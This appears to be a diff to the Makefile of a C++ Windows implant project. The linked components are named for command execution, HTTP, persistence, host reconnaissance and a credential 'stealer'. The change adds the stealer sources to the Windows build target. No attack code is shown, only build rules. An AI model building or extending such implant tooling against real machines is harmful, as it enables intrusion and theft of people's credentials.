@@ -1,6 +1,7 @@
 MAC = x86_64-w64-mingw32-g++ 
 CXX = g++
-LIBRARIES =  -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static
+LIBRARIES = -lwinhttp -lcrypt32 -luserenv -lbcrypt -static
+
 FILES = execute/execute.cpp file/file.cpp http/http.cpp persist/persist.cpp
 FILES2 = situational_awareness/GatherInfo.cpp
 FILES3 = stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp
@@ -8,7 +9,7 @@ FILES3 = stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/
 apple: $(eval SHELL:=/bin/zsh)
 	$(MAC) implant.cpp $(FILES) $(FILES2) $(LIBRARIES) -o implant.exe
 
-windows:
-	$(CXX) implant.cpp $(FILES) $(FILES2) $(LIBRARIES) -o implant.exe
+windows: implant.cpp
+	$(CXX) implant.cpp $(FILES) $(FILES2) $(FILES3) $(LIBRARIES) -o implant.exe
 
 
